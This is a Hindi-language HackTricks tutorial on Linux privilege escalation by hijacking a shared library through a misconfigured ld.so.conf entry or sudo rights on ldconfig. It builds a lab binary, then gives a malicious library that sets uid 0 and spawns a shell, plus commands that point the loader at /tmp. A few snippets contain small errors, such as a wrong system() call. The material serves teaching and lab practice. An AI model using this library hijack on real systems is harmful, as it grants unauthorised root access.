# ld.so privesc exploit example

<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

## पर्यावरण तैयार करें

निम्नलिखित खंड में आपको फाइलों का कोड मिलेगा जिनका उपयोग हम पर्यावरण तैयार करने के लिए करने वाले हैं

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **बनाएं** अपनी मशीन में उन फाइलों को उसी फोल्डर में
2. **कंपाइल** करें **लाइब्रेरी**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **कॉपी** करें `libcustom.so` को `/usr/lib` में: `sudo cp libcustom.so /usr/lib` (root privs)
4. **कंपाइल** करें **एक्जीक्यूटेबल**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### पर्यावरण की जांच करें

जांचें कि _libcustom.so_ _/usr/lib_ से **लोड** हो रहा है और आप बाइनरी को **एक्जीक्यूट** कर सकते हैं।

```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```

## एक्सप्लॉइट

इस परिदृश्य में हम मान रहे हैं कि **किसी ने **_**/etc/ld.so.conf/**_** में एक फाइल के अंदर एक संवेदनशील प्रविष्टि बनाई है**:

```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```

वल्नरेबल फोल्डर _/home/ubuntu/lib_ है (जहाँ हमें लिखने की अनुमति है)।\
**डाउनलोड और कंपाइल** करें निम्नलिखित कोड उस पथ के अंदर:

```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```

अब जबकि हमने **गलत कॉन्फ़िगर किए गए** पथ के अंदर **दुर्भावनापूर्ण libcustom लाइब्रेरी बना ली है**, हमें एक **रिबूट** का इंतजार करना होगा या फिर रूट यूजर को **`ldconfig`** निष्पादित करते हुए देखना होगा (_यदि आप इस बाइनरी को **sudo** के रूप में निष्पादित कर सकते हैं या इसमें **suid बिट** है तो आप इसे स्वयं निष्पादित कर पाएंगे_).

एक बार जब यह हो जाए, तो **पुनः जांचें** कि `sharevuln` निष्पादनयोग्य फ़ाइल `libcustom.so` लाइब्रेरी को कहाँ से लोड कर रहा है:

```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```

जैसा कि आप देख सकते हैं यह **`/home/ubuntu/lib` से लोड हो रहा है** और अगर कोई उपयोगकर्ता इसे निष्पादित करता है, तो एक शेल निष्पादित किया जाएगा:

```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```

{% hint style="info" %}
ध्यान दें कि इस उदाहरण में हमने विशेषाधिकार नहीं बढ़ाए हैं, लेकिन आदेशों को संशोधित करके और **रूट या अन्य विशेषाधिकार प्राप्त उपयोगकर्ता द्वारा संवेदनशील बाइनरी को निष्पादित करने की प्रतीक्षा करके** हम विशेषाधिकार बढ़ा सकते हैं।
{% endhint %}

### अन्य गलत कॉन्फ़िगरेशन - समान दोष

पिछले उदाहरण में हमने एक गलत कॉन्फ़िगरेशन का नकली बनाया जहां एक प्रशासक ने `/etc/ld.so.conf.d/` के अंदर एक कॉन्फ़िगरेशन फ़ाइल के अंदर एक गैर-विशेषाधिकार प्राप्त फ़ोल्डर **सेट किया**।\
लेकिन अन्य गलत कॉन्फ़िगरेशन भी हो सकते हैं जो समान दोष का कारण बन सकते हैं, अगर आपके पास `/etc/ld.so.conf.d` के अंदर किसी **कॉन्फ़िगरेशन फ़ाइल** में, `/etc/ld.so.conf.d` फ़ोल्डर में या `/etc/ld.so.conf` फ़ाइल में **लिखने की अनुमति** है तो आप समान दोष को कॉन्फ़िगर कर सकते हैं और इसका शोषण कर सकते हैं।

## Exploit 2

**मान लीजिए आपके पास `ldconfig` पर सुडो विशेषाधिकार हैं**।\
आप `ldconfig` को यह बता सकते हैं कि **कॉन्फ़िगरेशन फ़ाइलें कहां से लोड करें**, इसलिए हम इसका फायदा उठा सकते हैं ताकि `ldconfig` मनमाने फ़ोल्डर्स को लोड करे।\
तो, चलिए "/tmp" को लोड करने के लिए आवश्यक फ़ाइलें और फ़ोल्डर्स बनाते हैं:

```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```

अब, **पिछले एक्सप्लॉइट** में बताए गए अनुसार, **`/tmp` के अंदर दुर्भावनापूर्ण लाइब्रेरी बनाएं**।\
और अंत में, पथ को लोड करें और जांचें कि बाइनरी लाइब्रेरी को कहां से लोड कर रही है:

```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```

**जैसा कि आप देख सकते हैं, `ldconfig` पर sudo विशेषाधिकार होने से आप उसी कमजोरी का शोषण कर सकते हैं।**

{% hint style="info" %}
मुझे `ldconfig` को **suid bit** के साथ कॉन्फ़िगर किए जाने पर इस कमजोरी का शोषण करने का कोई विश्वसनीय तरीका **नहीं मिला**। निम्नलिखित त्रुटि दिखाई देती है: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## संदर्भ

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* HTB में Dab machine

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो** करें।
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>
